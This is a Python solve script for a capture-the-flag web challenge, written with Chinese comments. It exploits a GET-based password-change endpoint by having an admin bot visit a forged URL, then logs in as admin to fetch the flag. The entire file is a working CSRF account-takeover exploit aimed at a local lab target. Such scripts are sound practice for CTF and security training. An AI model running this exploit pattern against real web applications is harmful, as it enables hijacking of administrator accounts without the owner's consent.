#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
15-csrf-get-passwd

思路：
1. 题目存在 GET 改密码接口：/change-password?new=xxx
2. admin 机器人处于登录态，会定时访问用户在 /pages/submit 提交的 URL
3. 所以用普通用户登录后，提交 /change-password?new=我们的密码
4. 等 admin bot 访问后，admin 密码被改成我们的密码
5. 用 admin / 新密码 登录，访问 /admin 拿 flag

注意：
- 如果题目环境已经被别人/上一次运行改过，student/student 可能会失效。
- 所以脚本会先尝试已知 admin 密码，失败后再尝试完整 CSRF 流程。
"""

import re
import time
import argparse
import requests

BASE = os.environ.get("GKD_URL") or ("http://127.0.0.1:33861")
NEW_PASS = "ctfpass123"


def has_login_success(resp: requests.Response) -> bool:
    """判断是否登录成功：看 Set-Cookie / 跳转 / 页面导航，不只看状态码。"""
    text = resp.text or ""
    if "账号或密码错误" in text:
        return False
    if resp.status_code in (301, 302, 303) and resp.headers.get("Location") in ("/", "/admin"):
        return True
    if "session=" in resp.headers.get("Set-Cookie", ""):
        return True
    if "退出" in text or "/logout" in text or "提交" in text:
        return True
    return False


def login(sess: requests.Session, username: str, password: str) -> bool:
    r = sess.post(
        BASE + "/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=10,
    )
    print(f"[*] login {username}/{password}: status={r.status_code}, location={r.headers.get('Location')}")
    ok = has_login_success(r)
    if not ok:
        if "账号或密码错误" in r.text:
            print(f"[-] {username} 登录失败：服务端明确返回『账号或密码错误』")
        else:
            print(f"[-] {username} 登录状态不确定，响应前 120 字符：{r.text[:120]!r}")
    return ok


def get_flag_with_admin(password: str):
    """尝试用 admin/指定密码 登录并访问 /admin。"""
    sess = requests.Session()
    if not login(sess, "admin", password):
        return None

    r = sess.get(BASE + "/admin", timeout=10)
    m = re.search(r"TOGOGO-flag\{[^}]+\}", r.text)
    if m:
        return m.group(0)

    print("[-] admin 登录后没有在 /admin 页面匹配到 flag")
    print(r.text[:300])
    return None


def csrf_change_admin_password(new_password: str, wait_seconds: int):
    """完整 CSRF 流程：student 登录 -> 提交恶意 URL -> 等 bot。"""
    sess = requests.Session()

    print("[*] login as student ...")
    if not login(sess, "student", "student"):
        raise RuntimeError(
            "student/student 登录失败。首页虽然写了测试账号，但当前服务端返回账号或密码错误；"
            "可能题目环境状态已经被改过/未重置。可以先重置题目环境，或直接尝试 admin 已改后的密码。"
        )

    payload_path = f"/change-password?new={new_password}"
    print(f"[*] submit CSRF URL to bot: {payload_path}")

    # 不同题可能字段名叫 url / link / target，这里按常见字段多试几个。
    submitted = False
    for data in (
        {"url": payload_path},
        {"link": payload_path},
        {"target": payload_path},
    ):
        r = sess.post(BASE + "/pages/submit", data=data, allow_redirects=False, timeout=10)
        print(f"[*] submit with {list(data)[0]}: status={r.status_code}, location={r.headers.get('Location')}")
        if r.status_code in (200, 301, 302, 303) and "登录" not in r.text:
            submitted = True
            break

    if not submitted:
        raise RuntimeError("提交 CSRF URL 失败，可能 /pages/submit 的字段名或逻辑有变化。")

    print(f"[*] wait bot {wait_seconds}s ...")
    time.sleep(wait_seconds)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--password", default=NEW_PASS, help="准备设置/尝试的 admin 新密码")
    parser.add_argument("--wait", type=int, default=18, help="提交 CSRF 后等待 bot 的秒数")
    parser.add_argument("--skip-submit", action="store_true", help="不走 student/CSRF，直接尝试 admin 登录")
    args = parser.parse_args()

    print("[*] target:", BASE)

    # 先尝试直接用已知新密码登录 admin，适合环境已经被改过的情况。
    print("[*] try direct admin login first ...")
    flag = get_flag_with_admin(args.password)
    if flag:
        print("[+] password:", args.password)
        print("[+] flag:", flag)
        return

    if args.skip_submit:
        raise SystemExit("[-] --skip-submit 模式下直接登录失败，停止。")

    # 直接登录失败，再走完整 CSRF。
    csrf_change_admin_password(args.password, args.wait)

    print("[*] try admin login after CSRF ...")
    flag = get_flag_with_admin(args.password)
    if flag:
        print("[+] password:", args.password)
        print("[+] flag:", flag)
        return

    raise SystemExit("[-] exploit failed: 没有拿到 flag。建议重置题目环境后再运行。")


if __name__ == "__main__":
    main()
